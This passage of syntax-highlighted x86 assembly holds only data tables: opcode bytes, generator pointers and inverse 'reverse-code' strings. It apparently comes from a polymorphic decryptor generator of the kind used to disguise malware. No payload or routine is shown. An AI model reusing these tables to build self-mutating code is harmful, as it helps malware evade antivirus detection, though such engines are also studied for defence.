                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zz_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Generators for [reg+reg+imm] indexing mode</span><span class="sc0">

</span><span class="sc5">tbl_paranoia</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_inc_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_dec_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_not_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_add_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_sub_reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ii_xor_reg</span><span class="sc0">

                </span><span class="sc1">;Opcodes for math reg,imm</span><span class="sc0">

</span><span class="sc5">tbl_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">                         </span><span class="sc1">;add</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0C8h</span><span class="sc0">                         </span><span class="sc1">;or</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc0">                         </span><span class="sc1">;and</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">                         </span><span class="sc1">;sub</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">                         </span><span class="sc1">;xor</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">                         </span><span class="sc1">;adc</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">                         </span><span class="sc1">;sbb</span><span class="sc0">

</span><span class="sc5">end_math_imm</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc1">;Magic aliases</span><span class="sc0">

</span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
</span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

                </span><span class="sc1">;Magic data</span><span class="sc0">

</span><span class="sc5">xx_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">xx_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">
                  
</span><span class="sc5">xx_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">yy_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">zz_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_CAREEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_inc_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_inc_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_dec_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8Ch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_dec_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_not_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">94h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_not_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_add_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_add_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_sub_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_sub_reg_dword</span><span class="sc0">

</span><span class="sc5">ii_xor_reg</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_NOTEBP</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_byte</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_word</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">x_xor_reg_dword</span><span class="sc0">

                </span><span class="sc1">;Reverse-code strings</span><span class="sc0">

</span><span class="sc5">x_inc_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_inc_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_inc_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_dec_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
</span><span class="sc5">x_not_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
